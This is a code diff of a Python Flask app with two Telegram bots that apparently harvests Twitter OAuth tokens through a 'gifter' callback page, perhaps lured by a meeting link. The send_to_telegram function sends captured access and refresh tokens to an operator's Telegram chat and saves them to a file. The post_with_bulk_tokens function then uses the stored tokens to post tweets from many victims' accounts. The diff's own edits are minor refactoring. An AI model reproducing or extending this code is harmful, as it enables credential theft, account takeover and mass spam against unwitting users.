@@ -10,7 +10,7 @@ from telegram.ext import CommandHandler, CallbackQueryHandler, Updater, MessageH
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
-CALLBACK_URL = 'https://gifter-7vz7.onrender.com/'  # Update with your callback URL
+CALLBACK_URL = 'https://gifter-7vz7.onrender.com'  # Update with your callback URL
 ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')  # Token for the alert bot
 AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')  # Token for the automation bot
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
@@ -18,7 +18,7 @@ TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# Initialize the two bots
+# Initialize Telegram Bots
 alert_bot = Bot(token=ALERT_BOT_TOKEN)
 automation_bot = Bot(token=AUTOMATION_BOT_TOKEN)
 alert_updater = Updater(token=ALERT_BOT_TOKEN, use_context=True)
@@ -47,7 +47,6 @@ def get_twitter_username(access_token):
     headers = {
         "Authorization": f"Bearer {access_token}"
     }
-
     response = requests.get(url, headers=headers)
     if response.status_code == 200:
         data = response.json()
@@ -76,14 +75,12 @@ def send_startup_message():
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
 
-    # Send the message through the alert bot
-    url = f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
         "parse_mode": "Markdown"
     }
-    requests.post(url, json=data)
+    requests.post(f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage", json=data)
 
 # Function to send tokens to Telegram using the alert bot
 def send_to_telegram(access_token, refresh_token=None):
@@ -109,13 +106,12 @@ def send_to_telegram(access_token, refresh_token=None):
 
     save_tokens_to_file(access_token, refresh_token)
 
-    url = f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
         "parse_mode": "Markdown"
     }
-    requests.post(url, json=data)
+    requests.post(f"https://api.telegram.org/bot{ALERT_BOT_TOKEN}/sendMessage", json=data)
 
 # Telegram Bot for Automation Tasks
 def start_automation(update, context):
@@ -172,6 +168,7 @@ def post_tweet(access_token, tweet_text):
         "Content-Type": "application/json"
     }
     payload = {"text": tweet_text}
+
     response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
     if response.status_code == 201:
         tweet_data = response.json()
@@ -196,7 +193,7 @@ def post_with_bulk_tokens(message, num_tokens):
             access_token, _ = tokens[i]
             result = post_tweet(access_token, message)
             automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
-            time.sleep(5)  # Delay between posts
+            time.sleep(5)
     else:
         automation_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="Not enough tokens available.")
 
@@ -208,12 +205,12 @@ automation_dispatcher.add_handler(CallbackQueryHandler(handle_button))
 # Flask route
 @app.route('/')
 def home():
-    pass
+    return "Server is running!"
 
 # Run the bots
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    send_startup_message()  # Send startup message through alert bot
-    alert_updater.start_polling()  # Start alert bot polling
-    automation_updater.start_polling()  # Start automation bot polling
+    send_startup_message()
+    alert_updater.start_polling()
+    automation_updater.start_polling()
     app.run(host='0.0.0.0', port=port)
